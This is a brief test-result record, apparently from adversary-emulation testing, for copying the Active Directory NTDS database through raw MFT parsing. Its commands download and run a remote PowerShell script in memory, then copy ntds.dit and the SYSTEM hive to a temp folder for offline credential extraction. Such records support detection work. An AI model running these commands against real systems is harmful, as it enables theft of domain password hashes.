results.test_name: Copy NTDS in low level NTFS acquisition via MFT parsing
results.command_executed:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1 -UseBasicParsing)
Underlay-Copy -Mode MFT -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile C:\Windows\Temp\ntds.dit
Underlay-Copy -Mode MFT -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile C:\Windows\Temp\SYSTEM_HIVE
